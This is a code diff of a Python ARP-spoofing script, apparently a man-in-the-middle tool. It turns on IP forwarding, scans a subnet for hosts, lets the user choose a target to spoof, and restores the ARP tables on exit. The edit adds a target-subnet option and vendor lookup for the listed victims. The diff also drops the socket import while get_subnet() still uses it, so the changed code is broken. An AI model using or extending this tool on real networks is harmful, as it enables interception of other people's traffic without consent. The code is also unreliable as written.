@@ -1,15 +1,20 @@
 #!/bin/env python3
 
 import time
-import socket
 import optparse
 import ipaddress
 import subprocess
 import scapy.all as scapy
 from colorama import Fore
+from mac_vendor_lookup import MacLookup
 
 start_time = time.time()
 subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+
+parser = optparse.OptionParser()
+parser.add_option("-t", dest="target", help="subnet to scan for targets")
+(options, arguments) = parser.parse_args()
+
 
 def get_subnet():
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -35,7 +40,8 @@ def scan(ip):
                 results.append(client_dict)
         return results
 
-results = scan(get_subnet())
+subnet = options.target if options.target else get_subnet()
+results = scan(subnet)
 gateway_ip = subprocess.check_output("route -n|sed -n 3p|cut -d ' ' -f10", shell=True).decode().strip('\n')
 for result in results:
 	if gateway_ip == result["ip"]:
@@ -46,7 +52,11 @@ def choose_target():
 	print("------------" + Fore.YELLOW + " Choose a Target " + Fore.WHITE + "------------")
 	global results
 	for x in range(len(results)):
-		print(str(x) + ") " + results[x]["ip"] + "   [" + results[x]["mac"] + "]")
+		try:
+			vendor = MacLookup().lookup(results[x]["mac"])
+		except:
+			vendor = "UNKNOWN"
+		print(str(x) + ") " + results[x]["ip"] + "  \t[" + results[x]["mac"] + "]  \t[" + vendor + "]")
 	try:
 		choice = input("\nChoose Target: ")
 	except KeyboardInterrupt:
@@ -106,11 +116,4 @@ while True:
 		time.sleep(0.5)
 		scapy.send(restore_packet, verbose=False)
 		exit(0)
-
-
-
-
-
-
-
 
